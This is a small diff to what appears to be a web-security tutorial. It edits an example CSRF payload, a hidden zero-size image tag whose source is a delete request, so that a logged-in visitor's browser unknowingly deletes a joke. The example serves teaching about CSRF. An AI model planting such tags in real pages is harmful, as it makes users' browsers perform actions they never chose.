@@ -30,5 +30,5 @@ request.send(null);
 CSRF attack. This entry forces the visitor's browser to issue a GET request to the server. If the visitor is logged-in, the request will successfully access a protected resource -- will delete a joke.
 
 ```html
-<img src="joke/delete?id=5&delete_confirmation=on" width="0" height="0" />
+<img src="joke/delete?id=3&delete_confirmation=on" width="0" height="0" />
 ```
